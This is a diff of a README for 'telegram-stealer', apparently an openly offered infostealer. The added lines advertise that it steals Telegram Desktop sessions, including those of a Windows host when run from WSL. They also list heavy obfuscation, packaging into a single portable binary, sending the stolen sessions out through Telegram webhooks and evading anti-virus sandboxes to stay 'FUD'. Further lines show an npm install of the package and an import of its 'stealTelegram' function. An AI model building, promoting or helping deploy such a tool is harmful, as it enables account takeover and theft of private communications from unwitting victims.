@@ -10,6 +10,15 @@ If the stealer is started inside WSL, it will get the Telegram Desktop sessions 
 
 https://youtu.be/3mKOwtCnwYw
 
+## Features
+
+- Steal Telegram Desktop sessions
+- Source is highly obfuscated using [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator) and packaged to a single portable binary using [pkg](https://github.com/vercel/pkg)
+- Works on all platforms, including WSL (on WSL, the binary will get the sessions from its Windows host)
+- Portable, you don't need to install anything to run the binary
+- Send sessions via Telegram using webhooks
+- Try to detect some anti-virus virtual machines to be FUD as long as possible
+
 ## Build
 
 Install dependencies
@@ -44,7 +53,7 @@ To hide the console window on a Windows machine, you can run the script using th
 npm install https://github.com/rigwild/telegram-stealer.git
 ```
 
-```js
+```ts
 import { run as stealTelegram } from 'telegram-stealer'
 
 type StealTelegram = (
